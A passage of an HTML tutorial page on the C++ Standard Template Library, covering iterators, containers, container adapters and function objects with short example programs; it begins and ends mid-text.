multimap;</li><li>Unordered associative containers: unordered_set, unordered_multiset,unordered_map, unordered_multimap.</li></ul><p>Container adapters: stack, queue, priority_queue (priority queue,underlying is max or min binary heap)</p><div class="note info flat"><p>To use containers, you need to include the corresponding headerfiles.</p></div><h2 id="basic-components-of-stl---iterators">Basic Components of STL -Iterators</h2><ul><li>Iterators are generalized pointers that provide methods forsequential access to each element in a container;</li><li>Provide methods for sequential access to each element in acontainer;</li><li>Can use the “++” operator to get an iterator pointing to the nextelement;</li><li>Can use the “*” operator to access the element pointed to by aniterator. If the element type is a class or structure, you can also usethe “-&gt;” operator to directly access a member of that element;</li><li>Some iterators also support getting an iterator pointing to theprevious element through the “–” operator;</li><li>Iterators are generalized pointers: pointers have the samecharacteristics, so pointers themselves are a type of iterator;</li><li>To use iterators independent of STL containers, you need to includethe header file <code>&lt;iterator&gt;</code>.</li></ul><h2 id="basic-components-of-stl---function-objects">Basic Components ofSTL - Function Objects</h2><ul><li>An object that behaves like a function, which can be called like afunction.</li><li>Function objects are generalized functions: any ordinary functionand any object of a class that overloads the “()” operator can be usedas a function object.</li><li>To use STL function objects, you need to include the header file<code>&lt;functional&gt;</code>.</li></ul><h2 id="basic-components-of-stl---algorithms">Basic Components of STL -Algorithms</h2><ul><li>STL includes more than 70 algorithms, such as: sorting algorithms,elimination algorithms, counting algorithms, comparison algorithms,transformation algorithms, permutation algorithms, and containermanagement;</li><li>Can be widely used for different objects and built-in datatypes;</li><li>To use STL algorithms, you need to include the header file<code>&lt;algorithm&gt;</code>.</li></ul><h3 id="algorithm-example---transform-algorithm">Algorithm Example -transform Algorithm</h3><p>The transform algorithm sequentially traverses the elements pointedto by the two iterators first and last; * Uses each element’s value as aparameter for the function object op; * Outputs op’s return valuesequentially through iterator result; * After traversal is complete, theresult iterator points to the position after the last output element,and transform will return that iterator.</p><p>For example, the following could be one implementation of thetransform algorithm: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>, <span class="keyword">class</span> <span class="title class_">UnaryFunction</span>&gt;</span><br><span class="line"><span class="function">OutputIterator <span class="title">transform</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result, UnaryFunction op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (;first != last; ++first, ++result) </span><br><span class="line">&#123;</span><br><span class="line">*result = <span class="built_in">op</span>(*first);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Example: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Read several integers from standard input, store in vector container, output their negatives</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s</span><span class="params">(N)</span></span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; s[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">transform</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout,<span class="string">&quot; &quot;</span>),<span class="built_in">negate</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="iterators">Iterators</h1><p>Iterators are the bridge between algorithms and containers: *Iterators are used to access elements in containers * Algorithms do notdirectly operate on data in containers, but indirectly throughiterators</p><p>Algorithms and containers are independent: * Adding new algorithmsdoes not affect container implementation * Adding new containers,existing algorithms can still be applied</p><h2 id="input-stream-iterators-and-output-stream-iterators">Input StreamIterators and Output Stream Iterators</h2><p>Input stream iterators * <code>istream_iterator&lt;T&gt;</code> *Constructed with input stream (such as cin) as parameter * Can use<em>(p++) to get the next input element Output stream iterators </em><code>ostream_iterator&lt;T&gt;</code> * Need to provide output stream(such as cout) when constructing * Can use (*p++) = x to output x to theoutput stream</p><p>Both belong to adapters * Adapters are objects used to provide newinterfaces for existing objects * Input stream adapters and outputstream adapters provide iterator interfaces for stream objects</p><p>Program example: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Read several real numbers from standard input, output their squares</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">square</span><span class="params">(<span class="type">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">transform</span>(<span class="built_in">istream_iterator</span>&lt;<span class="type">double</span>&gt;(cin),<span class="built_in">istream_iterator</span>&lt;<span class="type">double</span>&gt;(),<span class="built_in">ostream_iterator</span>&lt;<span class="type">double</span>&gt;(cout,<span class="string">&quot;\t&quot;</span>),square);</span><br><span class="line">    <span class="comment">//istream_iterator&lt;double&gt;() calls the default constructor of the input stream iterator, making it point to the end position of the input stream.</span></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//If you don&#x27;t manually terminate the program, it will keep running because the input stream is always waiting for your input</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="iterator-classification">Iterator Classification</h2><p>Classified by access method: <imgsrc="https://img-blog.csdnimg.cn/20200609192939833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTk2OTY5MA==,size_16,color_FFFFFF,t_70"alt="Fetching Title#2j8d" /></p><p>Relationship diagram: <imgsrc="https://pica.zhimg.com/80/v2-9cb5c611c9ab48c561a010de1208c150_1440w.png" /></p><p>Classified by operation type: <imgsrc="https://img-blog.csdnimg.cn/20200609192955690.png" /></p><h2 id="iterator-ranges">Iterator Ranges</h2><ul><li>Two iterators represent a range: [p1, p2), the range includes p1 butnot p2;</li><li>STL algorithms often use iterator ranges as input to pass inputdata;</li><li>Valid range: p1 satisfies p1 == p2 after n (n &gt; 0) increment (++)operations.</li></ul><p>Program example: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Example of comprehensive use of various iterators</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySort</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;T&gt; s;</span><br><span class="line">    <span class="keyword">while</span> (first != last)</span><br><span class="line">    &#123;</span><br><span class="line">        s.<span class="built_in">push_back</span>(*first);</span><br><span class="line">        first++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>()); <span class="comment">//sort parameters must be random access iterators</span></span><br><span class="line">    <span class="built_in">copy</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">double</span> a[<span class="number">5</span>] = &#123;<span class="number">1.2</span>, <span class="number">2.4</span>, <span class="number">0.8</span>, <span class="number">3.3</span>, <span class="number">3.2</span>&#125;;</span><br><span class="line">    <span class="comment">//Sort known array</span></span><br><span class="line">    <span class="built_in">mySort</span>&lt;<span class="type">double</span>&gt;(a, a + <span class="number">5</span>, <span class="built_in">ostream_iterator</span>&lt;<span class="type">double</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//Read several integers from standard input, output sorted results</span></span><br><span class="line">    <span class="built_in">mySort</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">istream_iterator</span>&lt;<span class="type">int</span>&gt;(cin), <span class="built_in">istream_iterator</span>&lt;<span class="type">int</span>&gt;(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="iterator-helper-functions">Iterator Helper Functions</h2><ul><li>advance(p,n): Perform n increment operations on p</li><li>distance(first,last): Calculate the distance between two iteratorsfirst and last</li></ul><h1 id="containers">Containers</h1><h2 id="basic-functions-and-classification-of-containers">BasicFunctions and Classification of Containers</h2><p><imgsrc="https://pica.zhimg.com/80/v2-015ee01d628fdd4ee76acf4213a6d583_1440w.png" /></p><p>Common functions of containers * Construct empty containers withdefault constructors * Support relational operators: ==, !=, &lt;,&lt;=, &gt;, &gt;= * begin(), end(): Get container head and tailiterators (<strong>actually pointing to the element after the lastelement of the container</strong>) * cbegin(), cend(): Get containerhead and tail const iterators, safer when not changing the container *clear(): Clear the container * empty(): Check if the container is empty* size(): Get the number of elements in the container * s1.swap(s2):Swap the contents of containers s1 and s2</p><p>Related data types (S represents container type) * S::iterator:Iterator type pointing to container elements * S::const_iterator: Constiterator type</p><p>Using begin()/end() of general containers, the iterators obtained areall forward iterators, while reversible containers provide bidirectionaliterators.</p><div class="note info flat"><p>In fact, STL templates provide standard containers that are at leastreversible containers, but some non-standard template libraries providecontainers like slist (singly linked list) that only provide forwarditerators.</p></div><h3 id="access-to-reversible-containers">Access to ReversibleContainers</h3><p>STL provides reverse iterators for each reversible container, whichcan be obtained through the following member functions: * rbegin():Reverse iterator pointing to the end of the container * rend(): Reverseiterator pointing to the beginning of the container</p><p>The type names of reverse iterators are represented as follows (Srepresents container type): * S::reverse_iterator: Reverse iterator type* S::const_reverse_iterator: Reverse const iterator type</p><p>Reverse iterators are adapters of ordinary iterators, where ++ ofreverse iterators is mapped to – of forward iterators.</p><blockquote><p>Details: An iterator and its reverse iterator can be converted toeach other. For example: if p1 is an iterator of type S::iterator, thenusing the expression S::reverse_iterator(p1) can get the reverseiterator corresponding to p1; you can also use the base function to getthe ordinary iterator corresponding to the reverse iterator, such as: r1is a reverse iterator constructed through S::reverse_iterator(p1), thenr1.base() == p1. But r1 and p1 do not point to the same element, theelement pointed to by r1 is always the same as the element pointed to byp1-1.</p></blockquote><h2 id="sequential-containers">Sequential Containers</h2><p>Sequential containers in STL * vector * deque * list * forward_list *array</p><ul><li>Elements are arranged linearly, and elements can be inserted anddeleted at specified positions at any time.</li><li>Must conform to the Assignable concept (i.e., have public copyconstructors and can be assigned with “=”).</li><li>array objects have fixed size, forward_list has special add anddelete operations.</li></ul><h3 id="sequential-container-interface">Sequential ContainerInterface</h3><div class="note danger flat"><p>Does not include singly linked list (forward_list) and array</p></div><ol type="1"><li>Constructors<ul><li>List initialization, such as<code>vector&lt;int&gt; arr = &#123;1,4,5,7&#125;;</code></li></ul></li><li>Assignment functions<ul><li>assign</li></ul></li><li>Insert functions<ul><li><code>insert(iterator pos, const T&amp; v)</code>, after insertingat pos position, returns the iterator of the newly insertedelement;</li><li>push_front (only for list and deque), push_back;</li><li>emplace_front, emplace and emplace_back, these operations constructrather than copy elements into the container, these operationscorrespond to push_front, insert and push_back respectively, allowing usto place elements at the head of the container, a specified position andthe tail of the container.</li></ul></li><li>Delete functions<ul><li>erase, clear, pop_front (only for list and deque), pop_back</li></ul></li><li>Direct access to head and tail elements<ul><li>front, back</li></ul></li><li>Change size<ul><li>resize</li></ul></li></ol><div class="note success flat"><p>Remember that operations on the head are not suitable for datastructures with contiguous physical addresses.</p></div><h3 id="vector">Vector</h3><p>Features: * A dynamic array that can be extended * Fast randomaccess, fast insertion or deletion at the tail * Slow insertion ordeletion in the middle or head</p><p>Vector capacity: The size of actually allocated space * s.capacity():Returns current capacity * s.reserve(n): If capacity is less than n,extend s to make its capacity at least n * s.shrink_to_fit(): Reclaimunused element space, i.e., size and capacity function return values areequal</p><div class="note danger flat"><p>Invalidation: If adding elements causes vector to expand, then alliterators, pointers and references will be invalidated because memoryspace is reallocated; if there is no expansion, then only iteratorsafter the inserted (or deleted) elements will be invalidated (becauseelements are moved).</p></div><h3 id="deque">Deque</h3><p>Features * Fast insertion or deletion at both ends * Slow insertionor deletion in the middle * Random access is faster, but slower thanvector container</p><p>Deque is a segmented array in many STL implementations. Elements inthe container are stored in fixed-size arrays in segments. In addition,the container needs to maintain an index array storing the firstaddresses of these segmented arrays, so deque’s continuity is anillusion.</p><figure><imgsrc="https://img-blog.csdnimg.cn/20190217155302649.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQ2MjIwMg==,size_16,color_FFFFFF,t_70"alt="https://img-blog.csdnimg.cn/20190217155302649.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQ2MjIwMg==,size_16,color_FFFFFF,t_70" /><figcaptionaria-hidden="true">https://img-blog.csdnimg.cn/20190217155302649.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQ2MjIwMg==,size_16,color_FFFFFF,t_70</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//First output odd numbers in descending order, then output even numbers in ascending order.</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">istream_iterator&lt;<span class="type">int</span>&gt; <span class="title">i1</span><span class="params">(cin)</span>, i2</span>; <span class="comment">//Create a pair of input stream iterators, first is the beginning of standard input, second is the end of standard input</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s1</span><span class="params">(i1, i2)</span></span>;            <span class="comment">//Input data from standard input stream through input stream iterators</span></span><br><span class="line">    <span class="built_in">sort</span>(s<span class="number">1.</span><span class="built_in">begin</span>(), s<span class="number">1.</span><span class="built_in">end</span>());        <span class="comment">//Sort the input integers</span></span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; s2;</span><br><span class="line">    <span class="comment">//The following loop traverses s1</span></span><br><span class="line">    <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator iter = s<span class="number">1.</span><span class="built_in">begin</span>(); iter != s<span class="number">1.</span><span class="built_in">end</span>(); ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*iter % <span class="number">2</span> == <span class="number">0</span>) <span class="comment">//Even numbers go to s2 tail</span></span><br><span class="line">            s<span class="number">2.</span><span class="built_in">push_back</span>(*iter);</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//Odd numbers go to s2 head</span></span><br><span class="line">            s<span class="number">2.</span><span class="built_in">push_front</span>(*iter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Output the results of s2</span></span><br><span class="line">    <span class="built_in">copy</span>(s<span class="number">2.</span><span class="built_in">begin</span>(), s<span class="number">2.</span><span class="built_in">end</span>(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="list">List</h3><p>The underlying logic is a doubly linked list.</p><p>Features * Fast insertion and deletion of elements at any position *Does not support random access</p><p>Splice operation <code>s1.splice(p, s2, q1, q2)</code> means moving[q1, q2) from s2 to before the element pointed to by p in s1</p><h3 id="forward-list">Forward List</h3><p>Features: * Each node in a singly linked list only has a pointer tothe next node, with no simple way to get the predecessor of a node; *insert, emplace and erase operations are not defined, but insert_after,emplace_after and erase_after operations are defined. Their parametersare the same as list’s insert, emplace and erase, but they don’t insertor delete the element pointed to by iterator p1, but operate on the nodeafter the element pointed to by p1; * Does not support sizeoperation.</p><h3 id="array">Array</h3><p>Features: * array is a wrapper for built-in arrays, providing a saferand more convenient way to use arrays * The size of array objects isfixed. When defining, you need to specify both the element type and thecontainer size. * Cannot dynamically change container size</p><p><imgsrc="https://picx.zhimg.com/80/v2-ea9110203c1e89cfaac565d2c3356953_1440w.jpeg" /></p><h2 id="sequential-container-insert-iterators-and-adapters">SequentialContainer Insert Iterators and Adapters</h2><h3 id="sequential-container-insert-iterators">Sequential ContainerInsert Iterators</h3><p>Concept: Iterators used to insert elements at the head, tail, orspecified position in the middle of a container, including frontinserter (front_inserter), back inserter (back_inserter), and arbitraryposition inserter (inserter).</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="function">back_inserter <span class="title">iter</span><span class="params">(s)</span></span>;</span><br><span class="line">*(iter++) = <span class="number">5</span>; <span class="comment">//Insert 5 at the end of s through iter</span></span><br></pre></td></tr></table></figure><h3 id="sequential-container-adapters">Sequential ContainerAdapters</h3><p>Build some commonly used data structures based on sequentialcontainers, which are wrappers of sequential containers: * Stack: Thefirst pushed element is popped last * Queue: The first pushed element ispopped first * Priority queue: The “largest” element is popped first</p><p>Stack can use any sequential container as the base container, butqueue only allows <strong>front-inserting sequential containers</strong>(deque or list)</p><div class="note info flat"><p>The essence of priority queue is max (min) binary heap.</p></div><h4 id="common-operations-supported-by-stack-and-queue">CommonOperations Supported by Stack and Queue</h4><ul><li>s1 op s2 op can be one of ==, !=, &lt;, &lt;=, &gt;, &gt;=, itcompares elements between two container adapters in<strong>lexicographic order</strong>;</li><li>s.size() returns the number of elements in s;</li><li>s.empty() returns whether s is empty;</li><li>s.push(t) pushes element t into s;</li><li>s.pop() pops an element from s. For stack, the element popped eachtime is the last pushed element, while for queue, the element poppedeach time is the first pushed element;</li><li><strong>Does not support iterators</strong> because they do notallow access to arbitrary elements.</li></ul><h4 id="different-operations-of-stack-and-queue">Different Operations ofStack and Queue</h4><p>Stack operations: * s.top() returns a reference to the top element ofthe stack</p><p>Queue operations: * s.front() gets a reference to the head element ofthe queue * s.back() gets a reference to the tail element of thequeue</p><h4 id="priority-queue">Priority Queue</h4><p>Priority queue also supports element pushing and popping like stackand queue, but the order of element popping is related to element size.The element popped each time is always the “largest” element in thecontainer. <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">Sequence</span> = vector&lt;T&gt;</span><br><span class="line"><span class="keyword">class</span> priority_queue; </span><br></pre></td></tr></table></figure> The base container of priority queue mustbe a sequential container that <strong>supports random access</strong>.* Supports the size, empty, push, pop member functions of stack andqueue, with the same usage as stack and queue. * Priority queue<strong>does not support comparison operations</strong>. * Similar tostack, priority queue provides a top function that can get a referenceto the next element to be popped (i.e., the “largest” element).</p><h2 id="associative-containers">Associative Containers</h2><h3id="classification-and-basic-functions-of-associative-containers">Classificationand Basic Functions of Associative Containers</h3><p>For associative containers, each element has a key, and the order ofelements in the container is arranged in <strong>ascendingorder</strong> of key values.</p><blockquote><p>Unlike sequential containers where finding elements has timecomplexity <span class="math inline">\(O(n)\)</span>, associativecontainers organize elements into a <strong>balanced binarytree</strong> based on key size, with time complexity <spanclass="math inline">\(O(\log n)\)</span>.</p></blockquote><p>Classification of ordered associative containers: * Singleassociative containers (set and map) * Key values are<strong>unique</strong>, one key value <strong>can only correspond toone element</strong> * Multiple associative containers (multiset andmultimap) * Key values are <strong>not unique</strong>, one key valuecan <strong>correspond to multiple elements</strong> * Simpleassociative containers (set and multiset) * Container has only<strong>one type parameter</strong>, such as set<K>, multiset<K>,representing key type * The <strong>element of the container is the keyitself</strong> * Binary associative containers (map and multimap) *Container has <strong>two type parameters</strong>, such asmap&lt;K,V&gt;, multimap&lt;K,V&gt;, representing key and additionaldata types respectively * The element type of the container ispair&lt;K,V&gt;, i.e., a binary tuple composed of <strong>key type andadditional data type</strong></p><p>Interface * Construction: List initialization, such as<code>map&lt;string, int&gt; id_map = &#123;&#123;"Xiao Ming", 1&#125;, &#123;"Li Hua", 2&#125;&#125;</code>* Insert: insert * Delete: erase * Find: find * Bounds: lower_bound,upper_bound, equal_range * Count: count</p><blockquote><p>C++11 new standard defines 4 unordered associative containersunordered_set, unordered_map, unordered_multiset, unordered_multimap *Do not use comparison operators to organize elements, but through a hashfunction and the == operator of key type. * Provide the same operationsas ordered containers * Can directly define unordered containers withbuilt-in type keywords. * Cannot directly define unordered containerswith custom class key types. If needed, must provide our own hashtemplate.</p></blockquote><h3 id="set">Set</h3><p>Set is used to store a group of non-duplicate elements. Since theelements of the set are ordered, it can efficiently find specifiedelements and conveniently get the range of elements with specified sizein the container.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pair&lt;set&lt;<span class="type">double</span>&gt;::iterator,<span class="type">bool</span>&gt; r=s.<span class="built_in">insert</span>(v); </span><br><span class="line"><span class="keyword">if</span> (!r.second);</span><br><span class="line"><span class="comment">//Let me explain this a bit. The return value of the insert function is a binary tuple, first is an iterator, second is a bool value indicating whether insertion is possible.</span></span><br><span class="line"><span class="comment">//The first line constructs an r binary tuple, and the way to access its two elements is r.first and r.second.</span></span><br></pre></td></tr></table></figure><h3 id="map">Map</h3><p>Map and set both belong to single associative containers. Their maindifference is that the element type of set is the key itself, while theelement type of map is a <strong>binary tuple</strong> composed of keyand additional data.</p><p>When looking up an element by key in a set, it is generally only usedto determine whether the element exists, while when looking up anelement by key in a map, in addition to determining its existence, youcan also get <strong>corresponding additional data</strong>.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">courses.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;CSAPP&quot;</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">//Binary tuple initialization can use pair&lt;first_type,second_type&gt; r = &#123;element1,element2&#125;</span></span><br><span class="line"><span class="comment">//At the same time, if you want to use it as a function parameter, you can omit the construction step and directly use make_pair(element1,element2)</span></span><br></pre></td></tr></table></figure><h3 id="multiset-and-multimap">Multiset and Multimap</h3><p>Multiset is a set that <strong>allows duplicate elements</strong>,and multimap is a map that <strong>allows one key to correspond tomultiple additional data</strong>.</p><p>The usage of multiset and set, multimap and map is similar, with onlysubtle differences in a few member functions. The difference is mainlymanifested in <strong>removing the restriction that keys must beunique</strong>.</p><h1 id="function-objects">Function Objects</h1><h2 id="basic-concepts-and-classification-of-function-objects">BasicConcepts and Classification of Function Objects</h2><p>Function objects are actually objects that behave like functions.They can have no parameters or several parameters, and their function isto get a value or change the state of an operation.</p><blockquote><p>Any ordinary function and any object of a class that overloads thecall operator operator() satisfies the characteristics of functionobjects</p></blockquote><p><imgsrc="https://pic1.zhimg.com/80/v2-31d073302a8e96d89105422051760a76_1440w.png" /></p><p>The following are two programs with the same result:<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span> <span class="comment">//Include numerical algorithm header file</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//Define an ordinary function</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mult</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x * y; &#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> 